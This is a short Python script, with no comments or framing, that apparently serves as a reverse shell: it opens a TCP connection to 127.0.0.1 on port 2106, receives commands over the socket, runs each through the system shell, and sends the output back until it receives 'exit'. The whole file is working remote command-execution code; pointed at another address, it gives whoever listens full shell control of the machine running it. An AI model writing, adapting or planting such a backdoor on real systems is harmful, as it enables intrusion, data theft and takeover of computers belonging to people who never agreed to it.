#!/usr/bin/python3
import os
import socket
import subprocess

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 2106))

    while True:
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break

        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        except Exception as e:
            output = str(e).strip().encode()

        s.send(output)

    s.close()

if __name__ == "__main__":
    main()
